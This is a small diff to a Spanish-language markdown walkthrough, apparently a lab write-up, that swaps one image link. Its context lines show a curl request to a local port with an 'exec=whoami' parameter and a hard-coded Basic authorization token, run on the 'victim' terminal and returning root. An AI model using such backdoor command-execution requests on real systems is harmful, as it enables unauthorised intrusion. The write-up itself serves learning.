@@ -113,7 +113,8 @@ ahora en el terminal victima hacemos un:
     curl 127.0.0.1:8081?exec=whoami -H "Authorization: Basic we_are_bones_513546516486484"
 
 >que nos mostrara: root
-![[root1.png]]
+
+![image](https://github.com/user-attachments/assets/17b3323e-ccb5-4f3f-8985-f7d18390168b)
 
 seguimos probando aparte del whoami, mandamos un id para esta pagina: https://www.urlencoder.org/
 
